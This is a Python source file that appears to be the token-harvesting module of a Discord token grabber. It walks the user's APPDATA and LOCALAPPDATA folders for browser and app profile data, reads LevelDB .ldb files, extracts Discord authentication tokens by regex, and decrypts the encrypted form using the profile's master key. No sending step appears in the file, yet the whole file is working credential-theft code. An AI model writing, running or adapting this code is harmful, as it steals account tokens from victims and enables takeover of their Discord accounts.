import base64
import re
import os
import time

from queue import Queue
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Pool, Process, Manager
from multiprocessing.pool import ThreadPool
from os.path import join
from os.path import sep as SEP
from typing import List

from utils.crypto import getmasterkey, decrypt

CHUNK_SIZE = 100
TOKEN_REGEX = re.compile(r"([\d\w]{24}\.[\d\w]{6}\.[\d\w_-]{38}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)")


def GetDiscordTokens() -> List[str]:
    begintime = time.process_time()
    with ThreadPoolExecutor() as executor:
        future1 = executor.submit(GetAppDataPaths, 'APPDATA')
        future2 = executor.submit(GetAppDataPaths, 'LOCALAPPDATA')
    paths = future1.result() + future2.result()
    endtime = time.process_time()
    print(paths)
    print(f"Took {endtime - begintime} seconds for path discovery")
    tokens = []
    for path in paths:
        keyfile = join(path, "Local State")
        begintimeldb = time.process_time()
        ldbs = GetLDBFiles(path)
        endtimeldb = time.process_time()
        print(f"Took {endtimeldb - begintimeldb} seconds for ldb")
        for ldb in ldbs:
            try:
                f = open(ldb, "r", errors="ignore")
                content = f.read()
                f.close()
                with ThreadPoolExecutor() as executor:
                    for m in TOKEN_REGEX.findall(content):
                        executor.submit(ProcessToken, m, keyfile, tokens)
            except:
                pass
    return tokens


def ProcessToken(token, keyfile, tokens):
    cached_tokens = []
    if token.startswith("dQw4w9WgXcQ"):
        try:
            if token not in cached_tokens:
                cached_tokens.append(token)
                m = base64.b64decode(token.split("dQw4w9WgXcQ")[1])
                key = getmasterkey(keyfile)
                decrypted_token = decrypt(m, key)
                if decrypted_token not in tokens:
                    tokens.append(decrypted_token)
        except Exception:
            pass
    else:
        if token not in tokens:
            tokens.append(token)


def extract_files(dirs):
    ldbfiles = []
    for root, _, files in dirs:
        for file in files:
            if file.endswith('.ldb'):
                ldbfiles.append(os.path.join(root, file))
    return ldbfiles


def partition(iterable, chunk_size):
    chunks = []
    chunk = []
    for item in iterable:
        chunk.append(item)
        if len(chunk) == chunk_size:
            chunks.append(chunk)
            chunk = []
    if chunk:
        chunks.append(chunk)
    return chunks


def GetLDBFiles(path):
    ldbfiles = []

    with ThreadPool(4) as pool:
        chunks = [list(chunk) for chunk in partition(os.walk(path), 4)]
        results = pool.map(extract_files, chunks)

    for files in results:
        ldbfiles.extend(files)

    return ldbfiles


def process_directory(args):
    root, results = args
    datapaths = []

    for subdir, _, files in os.walk(root):
        for file in files:
            path = os.path.join(subdir, file)
            if "Local State" in path:
                datapaths.append(SEP.join(path.split(SEP)[:-1]))

    results.put(datapaths)


def GetAppDataPaths(env):
    results = Queue()

    roots = []
    for root, _, _ in os.walk(os.getenv(env)):
        roots.append(root)

    with ThreadPoolExecutor() as executor:
        for i in range(0, len(roots), CHUNK_SIZE):
            chunk = roots[i:i+CHUNK_SIZE]
            executor.map(process_directory, ((root, results) for root in chunk))
    datapaths = []
    while not results.empty():
        datapaths.extend(results.get())

    return datapaths